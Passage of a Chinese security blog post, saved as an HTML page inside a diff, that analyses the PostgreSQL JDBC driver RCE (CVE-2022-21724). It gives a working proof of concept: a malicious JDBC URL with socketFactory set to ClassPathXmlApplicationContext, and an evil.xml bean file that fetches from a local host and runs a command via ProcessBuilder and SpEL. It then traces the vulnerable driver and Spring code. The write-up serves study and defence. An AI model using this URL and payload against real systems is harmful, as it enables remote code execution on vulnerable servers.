@@ -1,0 +1,400 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="前言5月写的文章了，本来是打算把所有类型数据库的JDBC RCE写成一篇，一直没发。但是想想还是先把pgsql的单独拿出来，因为光其一篇的内容其实已经不少了。当时是看到p牛和Ar3h提出的小挑战学习到的，结果没过多久挖了一个系统的jdbc的rce漏洞，刚好可以用挑战题解的方法来不出网利用，也是很巧了。 漏洞环境依赖影响范围：9.4.1208 &lt;&#x3D;PgJDBC &lt;42.2.25">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PostgreSQL JDBC RCE &amp;&amp;不出网利用">
+<meta property="og:url" content="http://example.com/2025/08/18/PostgreSQL%20JDBC%20RCE%20&&%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/index.html">
+<meta property="og:site_name" content="cmisl_破站">
+<meta property="og:description" content="前言5月写的文章了，本来是打算把所有类型数据库的JDBC RCE写成一篇，一直没发。但是想想还是先把pgsql的单独拿出来，因为光其一篇的内容其实已经不少了。当时是看到p牛和Ar3h提出的小挑战学习到的，结果没过多久挖了一个系统的jdbc的rce漏洞，刚好可以用挑战题解的方法来不出网利用，也是很巧了。 漏洞环境依赖影响范围：9.4.1208 &lt;&#x3D;PgJDBC &lt;42.2.25">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250527131931856.png">
+<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250513145210711.png">
+<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250527165852967.png">
+<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250527170657046.png">
+<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250527172557370.png">
+<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250527172710828.png">
+<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250527173227560.png">
+<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250527181054398.png">
+<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250528150332993.png">
+<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250528154530433.png">
+<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250528161319512.png">
+<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250528161543167.png">
+<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250528162748151.png">
+<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250528174911128.png">
+<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250604183235504.png">
+<meta property="article:published_time" content="2025-08-17T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-08-17T16:35:02.934Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250527131931856.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>PostgreSQL JDBC RCE &amp;&amp;不出网利用</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/cmisl">项目</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2025/07/24/%E5%93%A5%E6%96%AF%E6%8B%89%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90(2)/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/08/18/PostgreSQL%20JDBC%20RCE%20&amp;&amp;%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/08/18/PostgreSQL%20JDBC%20RCE%20&amp;&amp;%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/&text=PostgreSQL JDBC RCE &amp;&amp;不出网利用"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/08/18/PostgreSQL%20JDBC%20RCE%20&amp;&amp;%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/&title=PostgreSQL JDBC RCE &amp;&amp;不出网利用"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/08/18/PostgreSQL%20JDBC%20RCE%20&amp;&amp;%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/&is_video=false&description=PostgreSQL JDBC RCE &amp;&amp;不出网利用"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=PostgreSQL JDBC RCE &amp;&amp;不出网利用&body=Check out this article: http://example.com/2025/08/18/PostgreSQL%20JDBC%20RCE%20&amp;&amp;%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/08/18/PostgreSQL%20JDBC%20RCE%20&amp;&amp;%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/&title=PostgreSQL JDBC RCE &amp;&amp;不出网利用"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/08/18/PostgreSQL%20JDBC%20RCE%20&amp;&amp;%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/&title=PostgreSQL JDBC RCE &amp;&amp;不出网利用"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/08/18/PostgreSQL%20JDBC%20RCE%20&amp;&amp;%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/&title=PostgreSQL JDBC RCE &amp;&amp;不出网利用"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/08/18/PostgreSQL%20JDBC%20RCE%20&amp;&amp;%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/&title=PostgreSQL JDBC RCE &amp;&amp;不出网利用"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/08/18/PostgreSQL%20JDBC%20RCE%20&amp;&amp;%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/&name=PostgreSQL JDBC RCE &amp;&amp;不出网利用&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/08/18/PostgreSQL%20JDBC%20RCE%20&amp;&amp;%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/&t=PostgreSQL JDBC RCE &amp;&amp;不出网利用"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83"><span class="toc-number">2.</span> <span class="toc-text">漏洞环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8CsocketFactory-socketFactoryArg"><span class="toc-number">3.</span> <span class="toc-text">远程命令执行socketFactory&amp;socketFactoryArg</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ClassPathXmlApplicationContext"><span class="toc-number">3.1.</span> <span class="toc-text">ClassPathXmlApplicationContext</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5-loggerLevel-loggerFile"><span class="toc-number">4.</span> <span class="toc-text">任意文件写入 loggerLevel&amp;loggerFile</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number"></span> <span class="toc-text">参考文章</span></a>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        PostgreSQL JDBC RCE &amp;&amp;不出网利用
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">cmisl</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-08-17T16:00:00.000Z" class="dt-published" itemprop="datePublished">2025-08-18</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>5月写的文章了，本来是打算把所有类型数据库的JDBC RCE写成一篇，一直没发。但是想想还是先把pgsql的单独拿出来，因为光其一篇的内容其实已经不少了。当时是看到p牛和Ar3h提出的小挑战学习到的，结果没过多久挖了一个系统的jdbc的rce漏洞，刚好可以用挑战题解的方法来不出网利用，也是很巧了。</p>
+<h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>依赖影响范围：<br>9.4.1208 &lt;&#x3D;PgJDBC &lt;42.2.25<br>42.3.0 &lt;&#x3D;PgJDBC &lt; 42.3.2</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.postgresql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>postgresql<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>42.3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-context-support<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.23<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>测试demo</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JDBC_ATTACK</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> SQLException &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">socketFactoryClass</span> <span class="operator">=</span> <span class="string">&quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;</span>;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">socketFactoryArg</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1:9999/evil.xml&quot;</span>;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">jdbcUrl</span> <span class="operator">=</span> <span class="string">&quot;jdbc:postgresql://127.0.0.1:5432/test/?socketFactory=&quot;</span>+socketFactoryClass+ <span class="string">&quot;&amp;socketFactoryArg=&quot;</span>+socketFactoryArg;  </span><br><span class="line">        System.out.println(jdbcUrl);  </span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DriverManager.getConnection(jdbcUrl);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>准备一个xml文件 如下——evil.xml</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span>  </span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>  </span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:p</span>=<span class="string">&quot;http://www.springframework.org/schema/p&quot;</span>  </span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans  </span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;pb&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">value</span>=<span class="string">&quot;calc&quot;</span> /&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;whatever&quot;</span> <span class="attr">value</span>=<span class="string">&quot;#&#123; pb.start() &#125;&quot;</span>/&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="远程命令执行socketFactory-socketFactoryArg"><a href="#远程命令执行socketFactory-socketFactoryArg" class="headerlink" title="远程命令执行socketFactory&amp;socketFactoryArg"></a>远程命令执行socketFactory&amp;socketFactoryArg</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:postgresql://127.0.0.1:5432/test/?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&amp;socketFactoryArg=http://127.0.0.1:9999/evil.xml</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250527131931856.png"></p>
+<p>下面调试流程图来自：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/11258">PostgresQL JDBC Drive 任意代码执行漏洞(CVE-2022-21724)-先知社区</a></p>
+<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250513145210711.png"></p>
+<p>调用链这张图很清楚了，我们就不一步步调试，只看需要关注的地方。</p>
+<p>从<code>DriverManager.getConnection出发到org.postgresql.Driver#connect</code>方法，将url解析的结果给到了一个表示属性的变量props，其中就有两个已经看起来不对劲了，socketFactory和socketFactoryArg，这两个都是可控的，一个叫socket工厂类，一个是工厂类参数，如果说这个工厂类在创造实例的时候没有限制范围，让我们任意创建了，构造函数的参数又可控，那就很容易造成RCE了。</p>
+<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250527165852967.png"></p>
+<p>解析的部分也很简单，通过？符号分割url指向的服务器和url参数，参数用&amp;分割来解析。</p>
+<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250527170657046.png"></p>
+<p>接着走到<code>org.postgresql.core.v3.ConnectionFactoryImpl#openConnectionImpl</code>中，这里是根据配置的主机列表、SSL 模式、目标服务器类型等参数，尝试建立与 PostgreSQL 服务器的连接，这个过程中会根据连接属性（info）动态获取一个 SocketFactory 实例，用于后续创建与 PostgreSQL 服务器通信的套接字（Socket），这里的info就是我们之前解析jdbc url的props。</p>
+<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250527172557370.png"></p>
+<p>获取了info中socketFactory和socketFactoryArg的值去创建工厂类。这两个值就是我们在url中传入的参数。</p>
+<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250527172710828.png"></p>
+<p>然后就是熟悉的Class.forName工厂类，然后用newInstance去实例化，实例化的时候将恶意xml文件的url作为参数传入。</p>
+<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250527173227560.png"></p>
+<p>如果熟悉ClassPathXmlApplicationContext类的话到这里就已经明白了原理，不了解这个类的也可以接着看看，我还是记录一个的过程。当然更推荐p牛的文章，写的很详细了，同时也介绍了该类的一个不出网利用手法：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/GS86e2azoF5AdvGYQPk-7g">Java利用无外网（下）：ClassPathXmlApplicationContext的不出网利用</a></p>
+<h3 id="ClassPathXmlApplicationContext"><a href="#ClassPathXmlApplicationContext" class="headerlink" title="ClassPathXmlApplicationContext"></a>ClassPathXmlApplicationContext</h3><p>这个类是 Spring 框架中 ApplicationContext 接口的一个实现类，用于从指定路径中加载 XML 配置文件，初始化 Spring 容器并管理 Bean 的生命周期。</p>
+<p>首先，这个类所有实例化方法都会走到下面这个重载的方法。其中configLocations就携带我们指定xml文件的路径。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ClassPathXmlApplicationContext</span><span class="params">(String[] configLocations, <span class="type">boolean</span> refresh, <span class="meta">@Nullable</span> ApplicationContext parent)</span> <span class="keyword">throws</span> BeansException &#123;  </span><br><span class="line">    <span class="built_in">super</span>(parent);  </span><br><span class="line">    <span class="built_in">this</span>.setConfigLocations(configLocations);  </span><br><span class="line">    <span class="keyword">if</span> (refresh) &#123;  </span><br><span class="line">        <span class="built_in">this</span>.refresh();  </span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>setConfigLocaltions这个方法是将指定路径设置到当前的这个ClassPathXmlApplicationContext对象的变量里，方便后续调用。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setConfigLocations</span><span class="params">(<span class="meta">@Nullable</span> String... locations)</span> &#123;  </span><br><span class="line">    <span class="keyword">if</span> (locations != <span class="literal">null</span>) &#123;  </span><br><span class="line">        Assert.noNullElements(locations, <span class="string">&quot;Config locations must not be null&quot;</span>);  </span><br><span class="line">        <span class="built_in">this</span>.configLocations = <span class="keyword">new</span> <span class="title class_">String</span>[locations.length];  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; locations.length; ++i) &#123;  </span><br><span class="line">            <span class="built_in">this</span>.configLocations[i] = <span class="built_in">this</span>.resolvePath(locations[i]).trim();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="built_in">this</span>.configLocations = <span class="literal">null</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>不过深入resolvePath方法来到PropertyPlaceholderHelper#parseStringValue中，这里有个操作在后续会用一定利用，可以看到出现了<code>$&#123;</code>这个符号，这里是会去查找占位符的前缀，然后找到对应的后缀，提取出占位符名称，接着通过PlaceholderResolver来解析这个占位符的值出去替换。</p>
+<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250527181054398.png"></p>
+<p>接着看到refresh方法，刚刚是配置了configLocations为我们指定的xml配置文件路径，接着就要去进行一个刷新操作了。整体流程可以分为准备阶段、BeanFactory构建、Bean实例化和收尾处理这四个阶段。触发点在finishBeanFactoryInitialization方法实例化的时候</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">refresh</span><span class="params">()</span> <span class="keyword">throws</span> BeansException, IllegalStateException &#123;  </span><br><span class="line">    <span class="keyword">synchronized</span>(<span class="built_in">this</span>.startupShutdownMonitor) &#123;  </span><br><span class="line">        <span class="type">StartupStep</span> <span class="variable">contextRefresh</span> <span class="operator">=</span> <span class="built_in">this</span>.applicationStartup.start(<span class="string">&quot;spring.context.refresh&quot;</span>);  </span><br><span class="line">        <span class="built_in">this</span>.prepareRefresh();  </span><br><span class="line">        <span class="type">ConfigurableListableBeanFactory</span> <span class="variable">beanFactory</span> <span class="operator">=</span> <span class="built_in">this</span>.obtainFreshBeanFactory();  </span><br><span class="line">        <span class="built_in">this</span>.prepareBeanFactory(beanFactory);  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="built_in">this</span>.postProcessBeanFactory(beanFactory);  </span><br><span class="line">            <span class="type">StartupStep</span> <span class="variable">beanPostProcess</span> <span class="operator">=</span> <span class="built_in">this</span>.applicationStartup.start(<span class="string">&quot;spring.context.beans.post-process&quot;</span>);  </span><br><span class="line">            <span class="built_in">this</span>.invokeBeanFactoryPostProcessors(beanFactory);  </span><br><span class="line">            <span class="built_in">this</span>.registerBeanPostProcessors(beanFactory);  </span><br><span class="line">            beanPostProcess.end();  </span><br><span class="line">            <span class="built_in">this</span>.initMessageSource();  </span><br><span class="line">            <span class="built_in">this</span>.initApplicationEventMulticaster();  </span><br><span class="line">            <span class="built_in">this</span>.onRefresh();  </span><br><span class="line">            <span class="built_in">this</span>.registerListeners();  </span><br><span class="line">            <span class="built_in">this</span>.finishBeanFactoryInitialization(beanFactory);  </span><br><span class="line">            <span class="built_in">this</span>.finishRefresh();  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (BeansException var10) &#123;  </span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.logger.isWarnEnabled()) &#123;  </span><br><span class="line">                <span class="built_in">this</span>.logger.warn(<span class="string">&quot;Exception encountered during context initialization - cancelling refresh attempt: &quot;</span> + var10);  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">            <span class="built_in">this</span>.destroyBeans();  </span><br><span class="line">            <span class="built_in">this</span>.cancelRefresh(var10);  </span><br><span class="line">            <span class="keyword">throw</span> var10;  </span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;  </span><br><span class="line">            <span class="built_in">this</span>.resetCommonCaches();  </span><br><span class="line">            contextRefresh.end();  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>当Spring加载我们构造的XML配置文件时，会创建pb这个bean。创建过程中，SpEL表达式会被执行，导致ProcessBuilder的start方法被调用，从而执行calc.exe。Spring的默认行为是在初始化单例bean时立即实例化，并且SpEL表达式在解析时会立即执行，这导致漏洞在上下文刷新阶段就被触发，无需等待其他操作。</p>
+<p>p牛的文章里提到这个refresh方法里面有个有意思的点，obtainFreshBeanFactory方法获取新BeanFactory的时候会去加载Bean定义，此时会先去location中获取在configLocations方法中指定的资源，也就是<a target="_blank" rel="noopener" href="http://127.0.0.1:9999/evil.xml%E3%80%82">http://127.0.0.1:9999/evil.xml。</a></p>
+<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250528150332993.png"></p>
